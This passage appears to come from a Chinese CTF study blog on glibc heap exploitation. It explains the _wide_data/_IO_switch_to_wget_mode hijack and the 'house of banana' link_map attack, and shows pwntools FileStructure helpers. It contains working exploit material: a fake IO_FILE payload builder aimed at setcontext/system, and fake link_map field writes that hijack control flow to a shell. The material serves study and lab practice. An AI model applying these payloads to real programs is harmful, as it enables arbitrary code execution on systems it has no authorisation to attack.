class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wfile_seekoff)</span><br></pre></td></tr></table></figure>


<p>在这里调用 <code>_wide_data</code> 里的 <code>vtable的_overflow</code>，JUMP宏 且没有检查</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_switch_to_wget_mode)</span><br></pre></td></tr></table></figure>

<p>在<code>_IO_switch_to_wget_mode</code> 调试时发现如下的汇编代码</p>
<ul>
<li>rdi 是 fp 指针，是我们可以伪造的一个 IO_FILE。</li>
<li>通过 rdi控制 rax，在通过rax控制rdx，也可以过jbe指令。从而最后call 我们指定的shellcode</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7f4cae745d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line"> <span class="number">0x7f4cae745d34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line"> <span class="number">0x7f4cae745d3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line"> <span class="number">0x7f4cae745d3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line"> <span class="number">0x7f4cae745d49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line"> <span class="number">0x7f4cae745d50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line"> <span class="number">0x7f4cae745d55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure>

<p>所以最后的伪造如下</p>
<ul>
<li>rax1 为上面的rax</li>
<li>rax2 为下面的rax寄存器</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fake_io_addr = heapbase+<span class="number">0xb00</span>                        <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE = p64(rdi)                              <span class="comment"># _flags=rdi</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>)                        <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>)               <span class="comment"># _IO_backup_base=rdx</span></span><br><span class="line">fake_IO_FILE += p64(call_addr)                       <span class="comment"># _IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                               <span class="comment"># _chain</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)                 <span class="comment"># _lock = a writable address</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>)               <span class="comment"># _wide_data, rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                               <span class="comment"># mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)          <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)               <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure>

<h2 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h2><p>不是一种攻击IO_FILE的利用手段。程序通过exit退出时，会调用一个名叫 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<ul>
<li>可以任意地址写一个堆地址（通常使用 <code>large bin attack</code>）</li>
<li>能够从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li>
<li>可以泄露 <code>libc</code> 地址和堆地址</li>
</ul>
<p>gdb 常用的指令</p>
<ul>
<li>这是ld.so 文件中的一个地址，因此不能使用libc.sym获得地址</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">p &amp;(_rtld_global._dl_ns._ns_loaded-&gt;l_next-&gt;l_next-&gt;l_next)</span><br><span class="line">p &amp;_rtld_global</span><br></pre></td></tr></table></figure>


<p><code>rtld_global</code> 结构体里面装有 <code>_dl_ns</code> 结构体，通过正常 main 函数返回或者调用 exit 退出，触发函数调用链：<code>exit()-&gt;_dl_call_fini-&gt;(fini_t)array[i]</code>。</p>
<ul>
<li>glibc 2.37 后的源码，对比之前的与那吗，发现主要的变化为 <code>_dl_call_fini(l);</code>，跟进函数发现除了输出debugging信息函数变了，其余都没变</li>
<li>link map 使用双向链表连接起来</li>
<li>nmaps 是 <code>maps[]</code> 中元素个数，也就是 <code>GL(dl_ns)[ns]._ns_loaded</code></li>
<li>建议自己随便写个程序，将其中变量打印出来看看。这里加载下面的注释里</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pwndbg&gt; p _rtld_global </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line">again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_nns  =&gt;  1</span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_nloaded  =&gt; 4</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nloaded = <span class="built_in">GL</span>(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* No need to do anything for empty namespaces or those used for</span></span><br><span class="line"><span class="comment">       auditing DSOs.  */</span></span><br><span class="line">    <span class="keyword">if</span> (nloaded == <span class="number">0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">        || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    )</span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_DELETE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we can allocate an array to hold all the pointers and</span></span><br><span class="line"><span class="comment">         copy the pointers in.  */</span></span><br><span class="line">	  <span class="comment">// nloaded =&gt; 4</span></span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *maps[nloaded];</span><br><span class="line"></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">link_map</span> *l;</span><br><span class="line">      <span class="built_in">assert</span>(nloaded != <span class="number">0</span> || <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="comment">// ns=0    pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded</span></span><br><span class="line">	  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_next.l_next.l_next.l_next  直到出现0</span></span><br><span class="line">      <span class="keyword">for</span> (l = <span class="built_in">GL</span>(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">        <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">        <span class="comment">// pwndbg p _rtld_global._dl_ns[0]._ns_loaded.l_real</span></span><br><span class="line">        <span class="comment">// 需要进入这个if线</span></span><br><span class="line">        <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">          <span class="built_in">assert</span>(i &lt; nloaded);   <span class="comment">// 所以说不会超过4个</span></span><br><span class="line"></span><br><span class="line">          maps[i] = l;</span><br><span class="line">          l-&gt;l_idx = i;</span><br><span class="line">          ++i;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">             are not dlclose()ed from underneath us.  */</span></span><br><span class="line">          ++l-&gt;l_direct_opencount;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">assert</span>(ns != LM_ID_BASE || i == nloaded);  <span class="comment">// 过其中一个检查，i==nloaded,也就是全部的if线都要进入。</span></span><br><span class="line">      <span class="built_in">assert</span>(ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">      <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now we have to do the sorting.  We can skip looking for the</span></span><br><span class="line"><span class="comment">         binary itself which is at the front of the search list for</span></span><br><span class="line"><span class="comment">         the main namespace.  */</span></span><br><span class="line">      _dl_sort_maps(maps, nmaps, (ns == LM_ID_BASE), <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We do not rely on the linked list of loaded object anymore</span></span><br><span class="line"><span class="comment">         from this point on.  We have our own list here (maps).  The</span></span><br><span class="line"><span class="comment">         various members of this list cannot vanish since the open</span></span><br><span class="line"><span class="comment">         count is too high and will be decremented in this loop.  So</span></span><br><span class="line"><span class="comment">         we release the lock so that some code which might be called</span></span><br><span class="line"><span class="comment">         from a destructor can directly or indirectly access the</span></span><br><span class="line"><span class="comment">         lock.  */</span></span><br><span class="line">      __rtld_lock_unlock_recursive(<span class="built_in">GL</span>(dl_load_lock));</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* &#x27;maps&#x27; now contains the objects in the right order.  Now</span></span><br><span class="line"><span class="comment">         call the destructors.  We have to process this array from</span></span><br><span class="line"><span class="comment">         the front.  */</span></span><br><span class="line">	  <span class="comment">// nmaps = 4</span></span><br><span class="line">      <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">link_map</span> *l = maps[i];   <span class="comment">// _ns_loaded</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">          _dl_call_fini(l);            <span class="comment">// 进入这个函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">          <span class="comment">/* Auditing checkpoint: another object closed.  */</span></span><br><span class="line">          _dl_audit_objclose(l);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">        --l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      _dl_audit_activity_nsid(ns, LA_ACT_CONSISTENT);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (!do_audit &amp;&amp; <span class="built_in">GLRO</span>(dl_naudit) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    do_audit = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> again;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))</span><br><span class="line">    _dl_debug_printf(</span><br><span class="line">        <span class="string">&quot;\nruntime linker statistics:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;           final number of relocations: %lu\n&quot;</span></span><br><span class="line">        <span class="string">&quot;final number of relocations from cache: %lu\n&quot;</span>,</span><br><span class="line">        <span class="built_in">GL</span>(dl_num_relocations), <span class="built_in">GL</span>(dl_num_cache_relocations));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>走到 <code>_dl_call_fini</code></p>
<ul>
<li>存在一个函数调用 <code>((fini_t)array[sz])()</code>，map为参数，也就是上面的 <code>GL(dl_ns)[ns]._ns_loaded</code> 和其 next，next-&gt;next…</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _dl_call_fini(<span class="type">void</span> *closure_map) &#123;</span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded 和 l_next 指针</span></span><br><span class="line">  <span class="comment">// pwndbg p *(struct link_map *) 上一个指令地址</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">link_map</span> *map = closure_map;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">GLRO</span>(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    _dl_debug_printf(<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, map-&gt;l_name, map-&gt;l_ns);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure nothing happens if we are called twice.  */</span></span><br><span class="line">  map-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26]</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini_array = map-&gt;l_info[DT_FINI_ARRAY];</span><br><span class="line">  <span class="keyword">if</span> (fini_array != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_addr</span></span><br><span class="line">	<span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[26].d_un.d_val</span></span><br><span class="line">    <span class="built_in">ElfW</span>(Addr) *array = (<span class="built_in">ElfW</span>(Addr) *)(map-&gt;l_addr + fini_array-&gt;d_un.d_ptr);</span><br><span class="line">    <span class="comment">// pwndbg&gt; p _rtld_global._dl_ns[0]._ns_loaded.l_info[28].d_un.d_val / 8</span></span><br><span class="line">    <span class="type">size_t</span> sz = (map-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="built_in">sizeof</span>(<span class="built_in">ElfW</span>(Addr)));</span><br><span class="line">	<span class="comment">// 不管什么类型，最后调用的函数地址可以得到</span></span><br><span class="line">    <span class="keyword">while</span> (sz-- &gt; <span class="number">0</span>) ((<span class="type">fini_t</span>)array[sz])();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">  <span class="built_in">ElfW</span>(Dyn) *fini = map-&gt;l_info[DT_FINI];</span><br><span class="line">  <span class="keyword">if</span> (fini != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="built_in">DL_CALL_DT_FINI</span>(map, ((<span class="type">void</span> *)map-&gt;l_addr + fini-&gt;d_un.d_ptr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要是函数调用能攻击一下就行，为了更容易的通过if的条件的，我们一般替换链表最后一个 link_map，也就是打第3个linkmap<code>ns_loaded.l_next.l_next.l_netx</code></p>
<ul>
<li>这是部分的内容，只截取了我们需要的内容</li>
<li>伪造l_addr, fini_array-&gt;d_un.d_ptr 内容</li>
<li>DT_FINI_ARRAY 为 26，DT_FINI_ARRAYSZ 为 28</li>
<li>因为源码可能比较抽象，不如直接打印出来，这里只截取有用的部分</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p **(struct link_map **) 0x7ffff7fbb188</span><br><span class="line"><span class="variable">$5</span> = &#123;</span><br><span class="line">  l_addr = 140737349943296,</span><br><span class="line">  l_name = 0x7ffff7fbb660 <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,</span><br><span class="line">  l_ld = 0x7ffff7e18bc0,</span><br><span class="line">  l_next = 0x7ffff7fbbb90,</span><br><span class="line">  l_prev = 0x7ffff7fbb170,</span><br><span class="line">  l_real = 0x7ffff7fbb680,</span><br><span class="line">  l_ns = 0,</span><br><span class="line">  l_libname = 0x7ffff7fbbb10,</span><br><span class="line">  l_info = &#123;0x0, 0x7ffff7e18bc0, 0x7ffff7e18c70, 0x7ffff7e18c60, 0x7ffff7e18c00, 0x7ffff7e18c20, 0x7ffff7e18c30, 0x7ffff7e18ca0, 0x7ffff7e18cb0, 0x7ffff7e18cc0, 0x7ffff7e18c40, 0x7ffff7e18c50, 0x0, 0x0, 0x7ffff7e18bd0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18c80, 0x0, 0x0, 0x7ffff7e18c90, 0x0, 0x7ffff7e18be0, 0x0, 0x7ffff7e18bf0, 0x0, 0x0, 0x7ffff7e18cf0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d10, 0x7ffff7e18d00, 0x7ffff7e18ce0, 0x7ffff7e18cd0, 0x0, 0x0, 0x7ffff7e18d30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7e18d20, 0x0 &lt;repeats 25 <span class="built_in">times</span>&gt;, 0x7ffff7e18c10&#125;,</span><br><span class="line"></span><br><span class="line">pwndbg&gt; ptype ((struct link_map **) <span class="number">0</span>x7ffff7fbb188 )-&gt;l_info</span><br><span class="line">	type = struct &#123;</span><br><span class="line">	    Elf64_Sxword d_tag;</span><br><span class="line">	    union &#123;</span><br><span class="line">	        Elf64_Xword d_val;</span><br><span class="line">	        Elf64_Addr d_ptr;</span><br><span class="line">	    &#125; d_un;</span><br><span class="line">	&#125; *[<span class="number">77</span>]</span><br></pre></td></tr></table></figure>


<p>伪造，堆地址 A</p>
<ul>
<li>l &#x3D; l-&gt;real &#x3D;&gt; A + 0x28 内容放着堆地址 <code>0x28 = distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_real</code></li>
<li>l-&gt;l_init_called 不为0，数字随意，根据版本而异。 <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_init_called</code>。我测的是0x312</li>
<li><code>map.l_info[26]</code> 不为 0, <code>distance _rtld_global._dl_ns[0]._ns_loaded &amp;_rtld_global._dl_ns[0]._ns_loaded.l_info[26]</code></li>
<li><code>map.l_info[28]</code> + 8 控制循环次数，一般写成1就行</li>
<li>控制函数执行流 <code>map-&gt;l_addr + fini_array-&gt;d_un.d_ptr</code>。也就是 <code>map-&gt;l_addr + map-&gt;l_info[26]-&gt;d_un.d_ptr</code></li>
<li>fini_array <code>map.l_info[26]</code>偏移是0x110。那么28是0x120</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// l = l-&gt;real</span></span><br><span class="line">fake+<span class="number">0x28</span> = fake</span><br><span class="line"><span class="comment">// l-&gt;l_init_called，但是测试后是一个magic num，需要将其余结构体的linkmap 的 l_init_called 打印出来赋值</span></span><br><span class="line">fake+<span class="number">0x312</span> = <span class="number">0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意，需要设置 l_next 位置为0才行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的就比较固定了</span></span><br><span class="line"><span class="comment">// map.l_info[26]</span></span><br><span class="line">fake+<span class="number">0x110</span> = fake+<span class="number">0x40</span></span><br><span class="line"><span class="comment">// 0x48 是 d_un 结构体指针</span></span><br><span class="line">fake+<span class="number">0x48</span> = fake+<span class="number">0x58</span></span><br><span class="line"><span class="comment">// 后面加的那个东西</span></span><br><span class="line">fake+<span class="number">0x58</span> = shell    <span class="comment">// 0 + shell 执行shell</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// map.l_info[28]。由上可知，为0，同时为 26 的 d_tag 成员</span></span><br><span class="line">fake+<span class="number">0x120</span> = fake+<span class="number">0x48</span></span><br><span class="line"><span class="comment">// l_info[28] 的 d_un 指针。 sz=1</span></span><br><span class="line">fake+<span class="number">0x50</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h2 id="pwntools-filepointer"><a href="#pwntools-filepointer" class="headerlink" title="pwntools filepointer"></a>pwntools filepointer</h2><p>其实看pwntools文档可以看出其中对 <code>IO_FILE</code> 也存在很多可以利用的点</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwnlib.filepointer <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>

<ol>
<li>IO_FILE 结构体</li>
</ol>
<ul>
<li><code>_wide_data</code> 就是我们现在常利用的点。</li>
<li>改变成员也只是需要 <code>fs.flags = 0x123</code> 直接赋值</li>
<li>两个 unknown 变量填充结构体</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">FileStructure(null=<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>FileStructure()</span><br><span class="line">&#123; flags: <span class="number">0x0</span></span><br><span class="line"> _IO_read_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_read_end: <span class="number">0x0</span></span><br><span class="line"> _IO_read_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_base: <span class="number">0x0</span></span><br><span class="line"> _IO_write_ptr: <span class="number">0x0</span></span><br><span class="line"> _IO_write_end: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_base: <span class="number">0x0</span></span><br><span class="line"> _IO_buf_end: <span class="number">0x0</span></span><br><span class="line"> _IO_save_base: <span class="number">0x0</span></span><br><span class="line"> _IO_backup_base: <span class="number">0x0</span></span><br><span class="line"> _IO_save_end: <span class="number">0x0</span></span><br><span class="line"> markers: <span class="number">0x0</span></span><br><span class="line"> chain: <span class="number">0x0</span></span><br><span class="line"> fileno: <span class="number">0x0</span></span><br><span class="line"> _flags2: <span class="number">0x0</span></span><br><span class="line"> _old_offset: <span class="number">0xffffffff</span></span><br><span class="line"> _cur_column: <span class="number">0x0</span></span><br><span class="line"> _vtable_offset: <span class="number">0x0</span></span><br><span class="line"> _shortbuf: <span class="number">0x0</span></span><br><span class="line"> unknown1: <span class="number">0x0</span></span><br><span class="line"> _lock: <span class="number">0x0</span></span><br><span class="line"> _offset: <span class="number">0xffffffffffffffff</span></span><br><span class="line"> _codecvt: <span class="number">0x0</span></span><br><span class="line"> _wide_data: <span class="number">0x0</span></span><br><span class="line"> unknown2: <span class="number">0x0</span></span><br><span class="line"> vtable: <span class="number">0x0</span>&#125;</span><br></pre></td></tr></table></figure>


<ol start="2">
<li>house of orange</li>
</ol>
<ul>
<li>io_list_all 地址</li>
<li>伪造的 vtable 地址</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.orange(io_list_all=<span class="number">0xfacef00d</span>, vtable=<span class="number">0xcafebabe</span>)</span><br></pre></td></tr></table></figure>


<ol start="3">
<li>stdout leak</li>
</ol>
<ul>
<li>从 addr 泄露 size 大小的数据</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fileStr = FileStructure(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = fileStr.write(addr=<span class="number">0xcafebabe</span>, size=<span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>packing，因为我们需要伪造file结构体，因此我们可以使用如下函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 根据 context.arch打包， 类似 p32，p64 函数</span></span><br><span class="line">flat([</span><br><span class="line">	  con1,</span><br><span class="line">	  con2</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># offset: con, 类似于 cyclic(offset) + p64(con)</span></span><br><span class="line">flat(&#123;</span><br><span class="line">	<span class="number">0xe0</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相对偏移</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flat(&#123;<span class="number">0xe0</span>:&#123;<span class="number">0x0</span>: <span class="number">100</span>, <span class="number">0x10</span>: <span class="number">200</span>&#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 同时可以指定填充内容 和 总长度，因为我们伪造结构体需要满足一定条件</span></span><br><span class="line">flat(&#123;<span class="number">0xe0</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&quot;\x00&quot;</span>, length=<span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用法和flat(&#123;&#125;) 一样 官方文档是 alias of flat</span></span><br><span class="line">fit(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>最好手动调试一下 largebin attack 和 house_of_banana。</p>
<h3 id="house-of-banana-1"><a href="#house-of-banana-1" class="headerlink" title="house of banana"></a>house of banana</h3><p>参考一下 <a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana源码分析</a>这一篇文章的demo</p>
<ul>
<li>注意改rtld相关指针和libc的偏移大小</li>
</ul>
<p>makefile</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">CC := gcc</span><br><span class="line">CFLAFS := -g </span><br><span class="line"></span><br><span class="line">all: house_of_banana large_bin_attack</span><br><span class="line"><span class="keyword">default</span>: house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">TARGET := house_of_banana  large_bin_attack</span><br><span class="line"></span><br><span class="line">house_of_banana: house_of_banana.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">large_bin_attack: large_bin_attack.c </span><br><span class="line">	$(CC) $(CFLAFS) $^ -o $@</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	rm -f $(TARGET) </span><br></pre></td></tr></table></figure>

<p>house of banana</p>
<ul>
<li>伪造结构体 l_next 为 0</li>
<li>l_init_called 一个比较神奇的数字，具体的libc打印</li>
<li>ubuntu 22.04 LTS 测试一下，在gdb 下可以执行一个命令就会崩溃。</li>
<li>高版本libc 没有patch进行测试，但是根据源码可行（理论上）</li>
</ul>
